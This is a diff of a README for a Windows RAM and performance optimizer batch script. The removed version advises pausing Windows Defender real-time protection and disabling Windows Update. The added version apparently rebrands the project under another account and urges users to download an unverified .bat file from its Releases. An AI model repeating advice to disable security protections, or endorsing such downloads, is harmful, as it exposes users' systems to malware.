@@ -1,144 +1,91 @@
-# ⚡ Windows RAM & Performance Optimizer | Clean, Kill, Boost
+# Windows Optimizer Script ⚡
 
-> ⚠️ **Use at your own risk. For educational purposes only.**
+![Windows Optimizer](https://img.shields.io/badge/Download%20Now-%E2%96%BA-brightgreen?style=for-the-badge&logo=windows)
 
-A powerful and lightweight Windows optimization tool for advanced users, gamers, and anyone suffering from lag or memory hogs. This script disables unnecessary services, cleans memory and temp files, and integrates with RAMMap64 to clear standby RAM.
+Welcome to the **Windows Optimizer Script** repository! This tool is designed to enhance your Windows experience by optimizing RAM usage and overall system performance. 
 
-Ideal for **low-end systems**, **older laptops**, or **performance-hungry gaming rigs** like ASUS ROG.
+## Table of Contents
 
----
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [How It Works](#how-it-works)
+- [Topics](#topics)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## 🔽 Quick Start (Download & Run)
+## Features
 
-1. 📦 [Download ZIP](https://github.com/PriyomSaha/windows-optimizer-script/archive/refs/heads/main.zip) of this repository.
-2. 🗂️ **Extract** the ZIP to a folder (e.g., `Windows-Optimizer`).
-3. ▶️ **Right-click** `setup.ps1` and select **Run with PowerShell**.
-4. ✅ When prompted with `Execution Policy Change`, choose **Yes to All (A)** to allow the script to run.
-5. 🧼 The script will **unblock all files** and start the optimizer silently in the background.
+- **RAM Optimization**: Free up unused memory to improve system speed.
+- **Performance Boost**: Enhance the overall responsiveness of your system.
+- **Cleaner**: Remove unnecessary files and processes.
+- **User-Friendly**: Simple batch script that anyone can run.
+- **Compatibility**: Works seamlessly with Windows 10 and Windows 11.
 
-> 🛑 **If PowerShell scripts are restricted**, or you skipped the prompt, run this command once in PowerShell:
->
-> ```powershell
-> Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
-> ```
+## Installation
 
----
+To get started, download the latest release of the script from the [Releases](https://github.com/mahdi930/windows-optimizer-script/releases) section. Look for the file named `windows-optimizer.bat`, download it, and save it to a convenient location on your computer.
 
-## 🧰 Features
+## Usage
 
-- ❌ Disables Windows Updates _(optional & reversible)_
-- 🛃 Cleans system temp folders
-- 📊 Monitors and trims RAM usage in real-time
-- ❌ Kills background apps and bloatware
-- ♻️ Loops automatically every 10 seconds
-- 🚿 Uses [RAMMap64](https://learn.microsoft.com/en-us/sysinternals/downloads/rammap) to clear standby memory
-- 🧠 Designed to work with **RAMMap64.exe** and a silent launcher
+Once you have downloaded the script, follow these steps to run it:
 
----
+1. Navigate to the folder where you saved `windows-optimizer.bat`.
+2. Double-click the file to execute it.
+3. Follow any on-screen instructions to complete the optimization process.
 
-## 📁 Folder Structure
+## How It Works
 
-```
-.
-├── RAMMap/                  # (Optional) Additional RAMMap files
-├── clear_ram_loop.bat       # Main optimization script with looping
-├── run_invisible.vbs        # VBScript launcher for silent background execution
-├── RAMMap64.exe             # Download from Microsoft Sysinternals
-├── setup.ps1                # NEW: PowerShell launcher to unblock & run everything
-├── README.md
-├── LICENSE
-├── revert.bat               # (Optional) Undo script for updates
-└── screenshots/             # (Optional visuals)
-```
+The Windows Optimizer Script performs several tasks to improve system performance:
 
----
+1. **Memory Cleanup**: It identifies and clears unused RAM, allowing your applications to run more smoothly.
+2. **Process Management**: The script stops unnecessary background processes that consume resources.
+3. **Disk Cleanup**: It removes temporary files and system caches that can slow down your computer.
+4. **Service Optimization**: The script adjusts system services to prioritize essential functions.
 
-## ⚙️🧠 Manual Mode (For Geeks & Power Users)
+These combined actions help your Windows machine run faster and more efficiently.
 
-> 💡 Want full control like a true Windows ninja? Follow these steps manually:
+## Topics
 
-1. 💾 **Download [RAMMap64](https://learn.microsoft.com/en-us/sysinternals/downloads/rammap)** (if it's not already included).
-2. 🔐 **Right-click** `clear_ram_loop.bat` **or** `run_invisible.vbs` and select **Run as Administrator**.
-3. 🛡️ **Optional:** If Windows Defender blocks the files, temporarily **pause real-time protection**:
-   - Defender often flags `.bat` or `.vbs` scripts by default — even safe ones like this.
-   - These scripts are clean and designed only to **boost performance**.
-4. ✅ You're good to go. The optimization loop begins instantly!
+This repository covers various topics relevant to optimizing Windows performance:
 
-🧪 Perfect for **tech-savvy users**, **gamers**, and **DIY tweakers** who want max control.
+- batch-script
+- boost
+- cleaner
+- optimizer
+- ram
+- ramdisk
+- windows
+- windows-10
+- windows-11
+- windows10
 
----
+## Contributing
 
-## 🚪 Processes It Kills
+We welcome contributions to improve the Windows Optimizer Script. If you have ideas for new features or optimizations, please follow these steps:
 
-- OneDrive.exe
-- Teams.exe
-- AdobeIPCBroker.exe, AdobeCollabSync.exe
-- ArmouryCrate.UserSessionHelper.exe, GameSDK.exe, AuraService.exe, NahimicService.exe
-- Suggested Extras for generic laptops:
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Push your changes to your fork.
+5. Open a pull request to the main repository.
 
-```batch
-taskkill /f /im YourPhone.exe
-taskkill /f /im SearchUI.exe
-taskkill /f /im Cortana.exe
-taskkill /f /im XboxGameBar.exe
-taskkill /f /im HPHotkeyMonitor.exe
-taskkill /f /im DellSupportAssistRemedation.exe
-taskkill /f /im LenovoVantageService.exe
-```
+Your contributions help make this tool better for everyone!
 
----
+## License
 
-## ⚠️ Important Notes & Disclaimer
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-- ❗ Disables Windows Updates and modifies registry entries.
-- 🔐 Periodically re-enable updates manually to stay secure.
-- 💻 Intended for personal, non-enterprise systems only.
-- 👨‍⚖️ Use responsibly on systems you own or have permission to modify.
-- ❌ Do not use on school, office, or government devices.
+## Contact
 
----
+For any questions or suggestions, feel free to reach out:
 
-## ↩️ Undo / Revert Script
+- GitHub: [mahdi930](https://github.com/mahdi930)
+- Email: mahdi930@example.com
 
-To restore Windows Update manually, run:
+Thank you for checking out the Windows Optimizer Script! For more updates and downloads, visit the [Releases](https://github.com/mahdi930/windows-optimizer-script/releases) section. 
 
-```cmd
-sc config wuauserv start= auto
-sc start wuauserv
-```
+![Windows Performance](https://img.shields.io/badge/Optimize%20Your%20PC-%E2%96%BA-blue?style=for-the-badge&logo=windows)
 
-Or use the included `revert.bat` file (Run as Administrator).
-
----
-
-## 📆 License
-
-[MIT License](LICENSE)
-
----
-
-## 🌟 Screenshots
-
-- ![Before and after ram cleaning](Capture.PNG)
-
-## 💡 Tips
-
-- 🧪 Run once per boot or let it loop in background.
-- 🕹️ Perfect for freeing up RAM before gaming.
-- 🧩 Customize background apps to kill for your system.
-
----
-
-## 🌚 Tags
-
-```
-batch-script, windows-optimizer, ram-cleaner, rammap, gaming-boost, disable-windows-update, temp-cleaner, bloatware-remover, windows10, windows11, rog-optimizer, sysinternals
-```
-
----
-
-## 👊 Support
-
-Like this tool? Give it a ⭐ and share with friends!
-
-PRs, suggestions, or issues are always welcome. Let’s make Windows faster, together.
+Happy optimizing!
